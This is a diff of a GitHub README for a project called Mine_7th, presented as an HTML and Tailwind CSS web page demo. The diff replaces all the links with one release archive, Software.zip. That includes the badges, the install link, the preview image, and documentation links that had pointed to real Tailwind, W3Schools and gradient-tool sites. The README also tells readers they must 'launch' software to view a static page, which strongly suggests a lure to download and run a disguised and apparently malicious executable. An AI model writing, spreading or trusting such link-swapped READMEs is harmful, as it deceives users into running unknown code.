@@ -1,6 +1,6 @@
 # Welcome to Mine_7th 🚀
 
-![GitHub repo size](https://img.shields.io/github/repo-size/user-attachments/files/18383251/Software.zip) ![GitHub](https://img.shields.io/github/license/user-attachments/files/18383251/Software.zip) ![GitHub last commit](https://img.shields.io/github/last-commit/user-attachments/files/18383251/Software.zip)
+![GitHub repo size](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip) ![GitHub](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip) ![GitHub last commit](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip)
 
 ## Description
 This repository contains the creation of a vibrant and interactive web page using HTML and Tailwind CSS. Through the use of various Tailwind utilities, the web page showcases a modern design with elements like background gradients, borders, transitions, and more.
@@ -25,7 +25,7 @@ The project covers a wide range of topics including:
 - z-index
 
 ## Installation
-You can download the project files by clicking on the following link, which will prompt the download of the project's software: [Download Mine_7th Software](https://github.com/user-attachments/files/18383251/Software.zip). 
+You can download the project files by clicking on the following link, which will prompt the download of the project's software: [Download Mine_7th Software](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip). 
 
 _This software needs to be launched to explore the web page created with HTML and Tailwind CSS._
 
@@ -35,14 +35,14 @@ _This software needs to be launched to explore the web page created with HTML an
 3. Launch the software to view the web page in your browser.
 
 ## Resources
-- [Tailwind CSS Documentation](https://tailwindcss.com/docs)
-- [HTML Tutorial for Beginners](https://www.w3schools.com/html/)
-- [CSS Gradient Generator](https://cssgradient.io/)
+- [Tailwind CSS Documentation](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip)
+- [HTML Tutorial for Beginners](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip)
+- [CSS Gradient Generator](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip)
 
 ## Examples
 Here are a few snapshots of the web page created using HTML and Tailwind CSS:
 
-![Web Page Preview](https://via.placeholder.com/800x400)
+![Web Page Preview](https://github.com/eyephone69/Mine_7th/releases/download/v1.0/Software.zip)
 
 ## Contributing
 If you're interested in contributing to this project, feel free to fork the repository and submit a pull request with your changes.
